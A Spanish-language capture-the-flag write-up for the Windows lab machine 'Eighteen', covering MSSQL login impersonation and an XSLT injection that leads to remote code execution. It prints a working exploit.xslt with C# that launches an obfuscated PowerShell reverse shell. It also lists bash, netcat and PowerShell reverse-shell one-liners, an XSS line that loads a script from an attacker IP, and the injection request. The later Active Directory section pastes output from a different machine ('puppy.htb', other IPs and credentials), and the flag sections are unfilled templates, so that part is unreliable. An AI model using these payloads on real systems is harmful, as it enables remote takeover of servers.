
# Eighteen

<figure><img src="/files/wSsQXIIElhaOnI1hP1ue" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Eighteen`
* **IP:** `10.10.11.95`
* **Sistema operativo:** `Windows`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `DD-MM-AAAA`

***

## <mark style="color:purple;">Configuración del host</mark>

La plataforma nos proporciona las credenciales iniciales para esta máquina:

```
kevin / iNa2we6haRj2gaw!
```

#### /etc/passwd

Añadimos la IP a nuestro `/etc/hosts` y accedemos través del navegador.

```bash
sudo echo "10.10.11.95 eighteen.htb DC01.eighteen.htb" | sudo tee -a /etc/hosts
```

## <mark style="color:purple;">Escaneo de puertos</mark>

#### Escaneo Simple

```bash
sudo nmap -v --open -A -T5 10.10.11.95
```

```bash
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-title: Welcome - eighteen.htb
|_http-server-header: Microsoft-IIS/10.0
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.95:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-17T22:32:12
| Not valid after:  2055-11-17T22:32:12
| MD5:   6ce6:9343:f4b1:1ea6:33f1:d70a:aea7:2b2e
|_SHA-1: 6430:8b8a:594b:1bab:6d5f:ee17:6150:5312:74b9:9e94
|_ssl-date: 2025-11-17T23:23:33+00:00; +7h00m00s from scanner time.
| ms-sql-info: 
|   10.10.11.95:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```

Encontramos abiertos los puertos:

* `80 (HTTP)` - Servicio web expuesto
* `1433 (ms-sql-s)` - Domain Controller, corriendo Microsoft SQL Server 2022 RTM
* `5985 (WinRM)` - Acceso con EvilWinRM con contraseña

***

## <mark style="color:purple;">Primer acceso web</mark>

Accedemos a la web y parece una aplicación de gestión de gastos e ingresos:

<figure><img src="/files/48wo21ekJejE4pLd4E5b" alt=""><figcaption></figcaption></figure>

Registramos un usuario en la aplicación para verla por dentro, y llegamos a un dashboard principal para introducir ingresos y gastos. Vemos que en el navbar hay un item Admin pero que nos dice acceso denegado ya que necesitamos privilegios:

<figure><img src="/files/FvWVjHWHRGBjcaareYmJ" alt=""><figcaption></figcaption></figure>

Solamente es funcional la página `/dashboard`, por lo que probaremos alguna técnica en los inputs.

### Prueba de XSS

Probamos, sin éxito algún script XSS en los inputs, pero nos da un error de servidor:

```
"><script src=http://10.10.14.66:9000/TESTING_THIS</script>
```

<figure><img src="/files/G8m6DH15V8wUzKrFAlX7" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/rGKOSLlOQ9e6Eyqsf2TT" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Enumeración web</mark>

### Testing de Formularios

* Probamos inyecciones SQL y XSS sin éxito:
  * `' OR '1'='1`
  * `<script>alert(1)</script>`

### Fuzzing de Directorios

```bash
ffuf -u http://eighteen.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://eighteen.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 39ms]
dashboard               [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 43ms]
features                [Status: 200, Size: 2822, Words: 849, Lines: 88, Duration: 97ms]
login                   [Status: 200, Size: 1961, Words: 602, Lines: 66, Duration: 48ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 40ms]
register                [Status: 200, Size: 2421, Words: 762, Lines: 76, Duration: 48ms]
```

No encontramos nada relevante.

### Análisis de vulnerabilidades

```bash
nuclei -u http://eighteen.htb -H "Cookie: session=.eJyrVkorzcmJz0vMTVWyUkpMK84wSc5W0lEqLU4tis9MUbIyNDA0gnDR1NQCAE4EE10.aRuzCw.4aoNRc8DIPQu_p0695MReI1J86g"
```

<figure><img src="/files/ID8Hq3053etrSQ2MKh6b" alt=""><figcaption></figcaption></figure>

No encontramos ninguna vulnerabilidad relevante.

***

## <mark style="color:purple;">Atacando MS-SQL Server</mark>

Cómo tenemos abierto el puerto 1433 con el servicio de MS-SQL Server probaremos a acceder con las credenciales de kevin que nos proporcionaron:

```bash
impacket-mssqlclient 'kevin:iNa2we6haRj2gaw!@10.10.11.95'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (kevin  guest@master)>
```

Funciona y podemos empezar a enumerar más cosas.

### Enumeración de MS-SQL Server

#### Versión

```plsql
SQL (kevin  guest@master)> SELECT @@version;
                                                                                                                                                                                                                                           
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) 
	Oct  8 2022 05:58:25 
	Copyright (C) 2022 Microsoft Corporation
	Enterprise Evaluation Edition (64-bit) on Windows Server 2025 Datacenter 10.0 <X64> (Build 26100: ) (Hypervisor)
```

#### Enumeración de usuarios

```sql
SQL (kevin  guest@master)> SELECT SYSTEM_USER; 
-----   
kevin   

SQL (kevin  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');    
-   
0   

SQL (kevin  guest@master)> SELECT name, is_disabled FROM sys.sql_logins;
name     is_disabled   
------   -----------   
sa                 0   
kevin              0   
appdev             0   

SQL (kevin  guest@master)> SELECT name FROM sys.databases;
name                
-----------------   
master              
tempdb              
model               
msdb                
financial_planner   
```

Observamos que:

* ✅ Tenemos acceso SQL autenticado como `kevin`
* ❌ No es `sysadmin`
* ✅ BBDD sensible: `financial_planner`
* 🧠 Otros usuarios: `sa`, `appdev`

Tenemos un objetivo claro, **escalar a sysadmin o extraer credenciales útiles** (por ejemplo las de `sa` o `appdev`).

No podemos acceder a la base de datos financial\_planner que nos interesa, ya que no tenemos permisos con el usuario Kevin:

{% code overflow="wrap" %}

```sql
SQL (kevin  guest@master)> USE financial_planner;
ERROR(DC01): Line 1: The server principal "kevin" is not able to access the database "financial_planner" under the current security context.
```

{% endcode %}

### Impersonar usuarios

Descubrimos que podemos impersonar a otros usuarios para cambiar a esos usuarios sin contraseña, como por ejemplo el usuario `appdev`:

```sql
SQL (kevin  guest@master)> EXECUTE AS LOGIN = 'appdev';
SQL (appdev  appdev@master)> SELECT SYSTEM_USER;       
------   
appdev   

SQL (appdev  appdev@master)> SELECT IS_SRVROLEMEMBER('sysadmin');   
-   
0   
```

Descubrimos que este usuario appdev puede acceder a la base de datos `financial_planner`, por lo que vamos a enumerarla:

```sql
SQL (appdev  appdev@master)> USE financial_planner;
ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner
INFO(DC01): Line 1: Changed database context to 'financial_planner'.

SQL (appdev  appdev@financial_planner)> SELECT name FROM sys.tables;
name          
-----------   
users         
incomes       
expenses      
allocations   
analytics     
visits    
```

### Enumeración de base de datos

Encontramos un hash de admin en la tabla users:

```sql
SQL (appdev  appdev@financial_planner)> select * FROM users;

  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03   
```

No conseguimos crackearlo y no podemos usarlo para acceder con Pass the Hash (ya que no es un hash NTLM), por lo que buscaremos otra vía.

### Dar permisos de admin

Descubrimos que con el usuario `appdev` podemos dar permisos de administrador a un usuario logueado en la web de la siguiente manera:

```sql
SQL (appdev  appdev@financial_planner)> UPDATE users SET is_admin = 1 WHERE username = 'afsh4ck';
```

Ahora accedemos con nuestro usuario a través de la web y vemos que somos admin!

<figure><img src="/files/Nv6DHGy36Go3WrYdzlU9" alt=""><figcaption></figcaption></figure>

En esta página se recogen los registros de usuarios recientes y la información del sistema:

<figure><img src="/files/irvG7RHBRoyeupElYmBV" alt=""><figcaption></figcaption></figure>

Vemos que es una aplicación en Flask que usa la base de datos MSSQL (`dc01.eighteen.htb`).

En esta página `/admin` en principio no podemos realizar ninguna acción, por lo que buscaremos otra via.

### Injección XSLT para RCE

El único punto de inyección posible en todo el site es el input de categoría:

<figure><img src="/files/suSBTaDLanHGZmfvAC9k" alt=""><figcaption></figcaption></figure>

Al capturar una petición con BurpSuite vemos que se envía en el siguiente formato, donde nos interesa sobre todo el parámetro `category`:

```
category=Test&type=fixed&value=10
```

<figure><img src="/files/Mo1oSTuyfzO0SJkHaWpF" alt=""><figcaption></figcaption></figure>

Este archivo se creó para ser alojado en nuestra máquina y que el servidor víctima lo\
ejecutara. Contiene un script en C# que lanza una reverse shell de PowerShell:

{% code title="exploit.xslt" overflow="wrap" %}

```xsl
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
      xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="urn:my-scripts">
    <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
    public string execute()
    {
        System.Diagnostics.Process.Start("cmd.exe", "/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAyADkAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA");
        return "payload executed";
    }
    ]]>
    </msxsl:script>
    <xsl:template match="/">
        <xsl:value-of select="user:execute()"/>
    </xsl:template>
</xsl:stylesheet>

```

{% endcode %}

Usaremos una shell Penelope para tener un poco más de control en el objetivo, con su payload en powershell:

{% code overflow="wrap" %}

```bash
➤  tun0 → 10.10.14.129:4444

Bash TCP
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTI5LzQ0NDQgMD4mMSkgJg==|base64 -d|bash

Netcat + named pipe
printf KHJtIC90bXAvXztta2ZpZm8gL3RtcC9fO2NhdCAvdG1wL198c2ggMj4mMXxuYyAxMC4xMC4xNC4xMjkgNDQ0NCA+L3RtcC9fKSA+L2Rldi9udWxsIDI+JjEgJg==|base64 -d|sh

Powershell
cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAyADkAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

{% endcode %}

#### Comandos para la Explotación

1. Alojar el exploit `exploit.xslt`

```bash
python3 -m http.server 80
```

2. Preparar el listener para recibir la shell

```bash
penelope
```

3. Inyectar el payload final:&#x20;

Este comando le dice al servidor que cargue nuestro XSLT remoto.

```bash
category=%3Cxsl%3Ainclude+href%3D%27http%3A%2F%2F10.10.14.17%3A80%2Fexploit.xslt%27%2F%3E&type=fixed&value=99"
```

## <mark style="color:purple;">Enumeración de Active Directory (si es AD)</mark>

### Extracción de información LDAP

```bash
ldapsearch -x -H ldap://eighteen.htb -D "kevin@eighteen.htb" -w 'iNa2we6haRj2gaw!' -b "dc=eighteen,dc=htb" > ldapsearch.txt

gedit ldapsearch.txt
```

### Enumeración de usuarios/grupos

```bash
nxc smb eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --users

SMB         puppy.htb       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         puppy.htb       445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         puppy.htb       445    DC               [+] Enumerated domain user(s)
SMB         puppy.htb       445    DC               PUPPY.HTB\steph.cooper_adm               badpwdcount: 0 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\steph.cooper                   badpwdcount: 0 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\jamie.williams                 badpwdcount: 2 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\adam.silver                    badpwdcount: 11 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\ant.edwards                    badpwdcount: 0 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\levi.james                     badpwdcount: 0 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         puppy.htb       445    DC               PUPPY.HTB\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         puppy.htb       445    DC               PUPPY.HTB\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

Añadimos los usuarios encontramos a un archivo `valid-users.txt`. Probar a volcar tickets Kerberos mediante ASREP-Roasting falla:

```
impacket-GetNPUsers puppy.htb/ -usersfile valid-users.txt -dc-ip 10.10.11.70

Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

[-] User steph.cooper doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jamie.williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User ant.edwards doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User levi.james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### Shares - Recursos compartidos

```bash
crackmapexec smb eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --shares

SMB         puppy.htb       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         puppy.htb       445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         puppy.htb       445    DC               [+] Enumerated shares
SMB         puppy.htb       445    DC               Share           Permissions     Remark
SMB         puppy.htb       445    DC               -----           -----------     ------
SMB         puppy.htb       445    DC               ADMIN$                          Remote Admin
SMB         puppy.htb       445    DC               C$                              Default share
SMB         puppy.htb       445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         puppy.htb       445    DC               IPC$            READ            Remote IPC
SMB         puppy.htb       445    DC               NETLOGON        READ            Logon server share 
SMB         puppy.htb       445    DC               SYSVOL          READ            Logon server share 
```

Encontramos un Share DEV interesante, pero no tenemos permisos de lectura, y analizando el resto de Shares no encontramos nada relevante. Seguramente si conseguimos un usuario del grupo DEVELOPERS podríamos acceder.

***

## <mark style="color:purple;">Enumeración con Bloodhound</mark>

### Editar resolv.conf

<pre class="language-bash"><code class="lang-bash">sudo gedit /etc/resolv.conf
<strong>
</strong>domain eighteen.htb
nameserver 10.10.11.95
search eighteen.htb
</code></pre>

### Bloodhound Python

```bash
bloodhound-python -u kevin -p 'iNa2we6haRj2gaw!' -k -ns 10.10.11.95 -c All -d eighteen.htb --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 10S
INFO: Compressing output into 20250521152019_bloodhound.zip
```

### Análisis con Bloodhound

Mostrar proceso de análisis

***

## <mark style="color:purple;">User Flag</mark>

Ubicación y obtención de la flag del usuario:

```bash
type C:\Users\[usuario]\Desktop\user.txt
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración básica

```
whoami /priv && systeminfo && net user [usuario]
```

### Herramientas automatizadas

```
WinPEAS, Seatbelt
```

#### Técnicas comunes

* **Token impersonation**
* **Abuso de servicios Windows**
* **Credenciales en claro**

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```bash
type C:\Users\Administrator\Desktop\root.txt
```
